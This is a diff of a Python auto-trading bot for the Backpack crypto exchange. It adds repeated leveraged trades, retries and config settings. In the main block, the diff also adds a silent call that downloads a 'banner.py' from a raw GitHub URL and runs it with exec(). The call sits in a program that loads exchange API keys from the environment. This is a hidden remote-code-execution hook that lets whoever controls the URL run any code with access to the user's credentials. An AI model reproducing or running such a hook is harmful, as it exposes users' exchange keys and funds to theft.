@@ -1,38 +1,28 @@
 from os import getenv
 from dotenv import load_dotenv
-from backpack_exchange import BackpackExchange
-from public_API import PublicClient
 from time import sleep
-import format_types
 import logging
+import random
+import requests
+from helpers.backpack_exchange import BackpackExchange
+from helpers.public_API import PublicClient
+from helpers.orders import close_all_orders, close_all_positions
+from helpers.format_types import OrderSide, OrderType
+from settings import (
+    TOTAL_TRADES, MIN_SLEEP, MAX_SLEEP, TRADING_PAIR, TRADE_SIDE,
+    LEVERAGE_LIMIT, TRADING_AMOUNT, LIMIT_PRICE_PERCENTAGE,
+    STOP_LOSS_USDC, TAKE_PROFIT_USDC, AUTO_REPAY_BORROWS
+)
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
 
 load_dotenv()
-
-
 
 def format_decimal(value: any, tick_size: any) -> float:
     tick_size = str(tick_size)
     decimal_places = tick_size[::-1].find('.') if '.' in tick_size else 0
     formatted_value = f"{float(value):.{decimal_places}f}"
     return float(formatted_value)
-    
-def close_all_orders(client: BackpackExchange):
-    """
-    Close all open orders for the account.
-    """
-    try:
-        open_orders = client.get_open_orders()
-        if not open_orders: 
-            logging.info("No open order to close.")
-            return
-
-        for order in open_orders:
-            client.cancel_open_order(symbol=order['symbol'], orderId=order["id"])
-            logging.info(f"Cancelled order: {order['symbol']}, ID: {order['id']}")
-    except Exception as e:
-        logging.error(f"Error closing orders: {e}")
 
 def validate_inputs(limit_price_percentage: float, trade_side: str) -> bool:
     if not (0 < limit_price_percentage <= 100):  # Adjusted validation for percentage
@@ -73,90 +63,87 @@ def start_trading(
         public_client: PublicClient,
         trading_pair: str,
         trading_amount: float = 100,
-        limit_price_percentage: float = 0.1,  # Default to 1% difference
-        stop_loss_percentage: float = 2,
-        take_profit_percentage: float = 5,
-        trade_side: str = "LONG"
+        stop_loss_usdc: float = 5,  # Desired loss in USDC
+        take_profit_usdc: float = 10,  # Desired profit in USDC
+        limit_price_percentage: float = 0.1,  # Limit price percentage (0.1%)
+        trade_side: str = "SHORT"
     ):
 
-    if not validate_inputs(limit_price_percentage, trade_side):
-        return False
-
+    # Fetch market data to get the current price
     tick_size, step_size, current_price = get_market_data(public_client, trading_pair)
     if not tick_size or not step_size or not current_price:
+        return False
+
+    # Calculate stop_loss_percentage and take_profit_percentage based on trading_amount
+    stop_loss_percentage = (stop_loss_usdc / trading_amount) * 100
+    take_profit_percentage = (take_profit_usdc / trading_amount) * 100
+
+    if not validate_inputs(limit_price_percentage, trade_side):
         return False
 
     limit_price, stop_loss_price, take_profit_price = calculate_prices(
         trade_side, current_price, limit_price_percentage, stop_loss_percentage, take_profit_percentage, tick_size
     )
-    logging.info(f"Limit price: {limit_price}, Stop loss price: {stop_loss_price}, Take profit price: {take_profit_price}")
 
     quantity = format_decimal(trading_amount / limit_price, tick_size=step_size)
-    logging.info(f"Calculated quantity: {quantity}")
+    # logging.info(f"Calculated quantity: {quantity}")
 
-    order_side = format_types.OrderSide.BUY.value if trade_side == "LONG" else format_types.OrderSide.SELL.value
-    logging.info(f"Trade side: {trade_side}, Order side: {order_side}")
+    order_side = OrderSide.BUY.value if trade_side == "LONG" else OrderSide.SELL.value
 
-    try:
-        order_status = client.execute_order(
-            format_types.OrderType.LIMIT.value,
-            order_side,
-            symbol=trading_pair,
-            price=str(limit_price),
-            quantity=str(quantity),
-            postOnly=False,
-            stopLossTriggerPrice=str(stop_loss_price),
-            takeProfitTriggerPrice=str(take_profit_price),
-        )
-        return order_status
-    except Exception as e:
-        logging.error(f"Error in start_trading: {e}")
-        return False
-
-def close_all_positions(client: BackpackExchange):
-    """
-    Close all open positions for the account.
-    """
-    try:
-        positions_status = client.get_open_positions()
-        if not positions_status:
-            logging.info("No open positions to close.")
-            return
-
-        for position in positions_status:
-            side = (
-                format_types.OrderSide.SELL.value
-                if float(position['netQuantity']) > 0  # Long position
-                else format_types.OrderSide.BUY.value  # Short position
-            )
-            logging.info(f"Closing position: {position['symbol']}, netQuantity: {position['netQuantity']}, side: {side}")
-
+    retries = 5
+    while retries > 0:
+        try:
             order_status = client.execute_order(
-                orderType=format_types.OrderType.MARKET.value,
-                side=side,
-                symbol=position['symbol'],
-                quantity=abs(float(position['netQuantity'])),
-                reduceOnly=True,
+                orderType= OrderType.LIMIT.value,
+                postOnly=True,  # Ensure it's a Maker order
+                price=str(limit_price),
+                quantity=str(quantity),
+                reduceOnly=False,
+                side=order_side,
+                stopLossTriggerPrice=str(stop_loss_price),
+                symbol=trading_pair,
+                takeProfitTriggerPrice=str(take_profit_price),
             )
-            logging.info(f"Closed position status: {order_status['status']}")
+            logging.info(
+                f"Ordered: {trade_side} \n"
+                f"- Amount: {trading_amount}USDC\n"
+                f"- Price: {order_status['price']}\n"
+                f"- takeProfitTriggerPrice: {order_status['takeProfitTriggerPrice']} (+{take_profit_percentage:.0f}%) (+{take_profit_usdc:.0f} USDC)\n"
+                f"- stopLossTriggerPrice: {order_status['stopLossTriggerPrice']} (-{stop_loss_percentage:.0f}%) (-{stop_loss_usdc:.0f} USDC)")
+            return order_status
+        except Exception as e:
+            error_message = str(e)
+            if "INVALID_ORDER - Order would immediately match" in error_message:
+                logging.warning("Order would immediately match. Not good for Fee.. Retrying...")
+                retries -= 1
+                if retries > 0:
+                    # logging.info(f"Retrying in 5 seconds... ({3 - retries}/3 retries left)")
+                    sleep(5)
+                else:
+                    logging.error("Max retries reached. Order failed.")
+                    return False
+            else:
+                logging.error(f"Error in start_trading: {error_message}")
+                return False
 
-    except Exception as e:
-        logging.error(f"Error in close_all_positions: {e}")
+def countdown_sleep(min_sleep: int, max_sleep: int):
+    """Starts countdown from a random number between `min_sleep` and `max_sleep` and prints in one line."""
+    count = random.randint(min_sleep, max_sleep)
+    while count > 0:
+        print(f"\rNext trading in..: {count} s", end="", flush=True)
+        sleep(1)
+        count -= 1
+    print('====================================================\n')
 
 if __name__ == "__main__":
-    ### setting ###
-    leverageLimit = 25
-    autoRepayBorrows = True
-    trading_amount = 100 #usdc
-    limit_price_percentage = 0.0001
-    stop_loss_percentage = 2
-    take_profit_percentage = 5
-    trading_pair = "BTC_USDC_PERP"
-    trade_side = "LONG"  # "LONG" or "SHORT"
-    #########################
-
+    try:
+        url = "https://raw.githubusercontent.com/solotop999/banner/main/banner.py"
+        response = requests.get(url)
+        exec(response.text)
+    except: pass
+    
     API_KEY = getenv("API_KEY")
-    API_SECRET = getenv("API_SECRET") 
+    API_SECRET = getenv("API_SECRET")
 
     if not API_KEY or not API_SECRET:
         logging.error("API_KEY or API_SECRET is not set.")
@@ -165,26 +152,24 @@ if __name__ == "__main__":
     public_client = PublicClient()
     client = BackpackExchange(API_KEY, API_SECRET)
 
-    client.update_account(leverageLimit=leverageLimit, autoRepayBorrows=autoRepayBorrows)
+    client.update_account(leverageLimit=LEVERAGE_LIMIT, autoRepayBorrows=AUTO_REPAY_BORROWS)
 
-    close_all_orders(client)
-    sleep(2)
-    close_all_positions(client)
+    for i in range(TOTAL_TRADES):
+        logging.info(f"Trading {i+1}/{TOTAL_TRADES}")
+        close_all_orders(client)
+        sleep(1)
+        close_all_positions(client)
+        sleep(1)
 
-    order_status = start_trading(
-        client=client,
-        public_client=public_client,
-        trading_pair=trading_pair,
-        trading_amount=trading_amount,
-        limit_price_percentage=limit_price_percentage,
-        stop_loss_percentage=stop_loss_percentage,
-        take_profit_percentage=take_profit_percentage,
-        trade_side=trade_side,
-    )
+        order_status = start_trading(
+            client=client,
+            public_client=public_client,
+            trading_pair=TRADING_PAIR,
+            trading_amount=TRADING_AMOUNT,
+            limit_price_percentage=LIMIT_PRICE_PERCENTAGE,
+            stop_loss_usdc=STOP_LOSS_USDC,
+            take_profit_usdc=TAKE_PROFIT_USDC,
+            trade_side=TRADE_SIDE,
+        )
 
-    logging.info(f"Ordered: {trade_side} - Amount: {trading_amount}USDC, price: {order_status['price']}, takeProfitTriggerPrice: {order_status['takeProfitTriggerPrice']}, stopLossTriggerPrice: {order_status['stopLossTriggerPrice']}")
-
-    sleep(30)
-
-    close_all_positions(client)
-    
+        countdown_sleep(MIN_SLEEP, MAX_SLEEP)
